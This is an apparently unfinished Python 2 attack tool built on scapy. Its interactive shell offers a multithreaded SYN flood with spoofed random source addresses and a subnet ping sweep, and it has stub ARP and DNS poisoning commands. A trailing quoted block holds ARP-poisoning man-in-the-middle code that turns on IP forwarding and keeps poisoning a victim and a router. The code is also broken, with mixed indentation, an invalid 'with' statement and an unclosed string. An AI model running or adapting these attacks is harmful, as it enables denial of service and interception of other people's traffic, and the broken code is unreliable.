import socket, random, sys, threading
import cmd
import logging
import string, sys
from scapy.all import *

#https://pypi.python.org/pypi/netaddr/ TODO
#targetip = ""
#port =""

'''TODO : cant get ip address. follow example 
'''
class sendSYN(threading.Thread):
        def __init__(self, targetip, port):
                threading.Thread.__init__(self)
		self.targetip = targetip
		self.port = port
	
        def run(self):
                i = IP()
                i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
                i.dst = self.targetip

                t = TCP()
                t.sport = random.randint(1,65535)
                t.dport = self.port
                t.flags = 'S'

                send(i/t, verbose=0)

 
class CLI(cmd.Cmd):

    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = '> '

    def do_clients(self, arg):
	""" clients [IP] [range]
	View clients connected to router
	clients 192.168.1.1 24 """

	#Ping scan network as background job
	#if we get a reply:
	#   add ip addr to list of hosts

	#Same command as: nmap -sP 192.168.1.1/24
	
	iplist = arg.split(" ")
	routerip = iplist[0]	
	iprange = int(iplist[1])	

#http://pastebin.com/xHZZ6Km2
#http://pythonicprose.blogspot.com/2009/07/python-ping-one-or-many-addresses-at.html
#https://pypi.python.org/pypi/python-nmap
	
	TIMEOUT = 1
	conf.verb = 0
	for ip in range(0, 256):
	    packet = IP(dst="192.168.1." + str(ip), ttl=20)/ICMP()
	    reply = sr1(packet, timeout=TIMEOUT)
	    if not (reply is None):
		print reply.dst, "is online"
	    else:
	    print "Timeout waiting for %s" % packet[IP].dst

    
    def do_arp(self, arg):
	"""arp [routerIP] [victimIP] [routerMAC] [victimMAC]"""
	
	
    def do_ip(self, arg):
	"""Gets local IP address.
	    Takes no arguements."""
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	ip = (s.getsockname()[0])
	print ip
	s.close()

    def do_dns(self, arg):
	"""DNS Poisioning."""	
    
    def do_syn(self, arg):
	"""syn [target ip] [port]
    #########################################
    # 
    # SYNflood - A multithreaded SYN Flooder
    # author: arthurnn
    #
    #
    #########################################

	   SYN flood: https://github.com/arthurnn/SynFlood  
	    """
	if not(arg):
	    print "No ip entered"
    
	else:

	    print "\n",arg,"\n"
	    targetlist = arg.split(" ")
	    targetip = targetlist[0]	
	    port = int(targetlist[1])	
	    print "Flooding %s:%i with SYN packets." % (targetlist[0], port)
	
	    total = 0
	    conf.iface='lo';#network card XD
 
	    while 1:
		syner = sendSYN(targetip, port)
		syner.start()
		total += 1
		sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
	
    def help_hello(self):
        print "syntax: hello [message]",
        print "-- prints a hello message"

    def do_quit(self, arg):
        sys.exit(1)

    def help_quit(self):
        print "syntax: quit",
        print "-- terminates the application"

    # shortcuts
    do_q = do_quit

if __name__ == '__main__':

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
   
#    print "Please enter network interface:"
    conf.iface = raw_input("Enter network interface: ")  
#    conf.iface='lo';#network card XD
    cli = CLI()
    cli.cmdloop()
'''

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address.
Example: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP address.
Example: -r 192.168.0.1")
    return parser.parse_args()
def originalMAC(ip):
    ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src
def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",
hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff",
hwsrc=routerMAC), count=3)
    sys.exit("losing...")
def main(args):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    routerIP = args.routerIP
    victimIP = args.victimIP
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)
    if routerMAC == None:
        sys.exit("Could not find router MAC address. Closing....")
    if victimMAC == None:
        sys.exit("Could not find victim MAC address. Closing....")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    def signal_handler(signal, frame):
        with ipf as open('/proc/sys/net/ipv4/ip_forward', 'w'):
            ipf.write('0\n')
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler)
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)
main(parse_args())
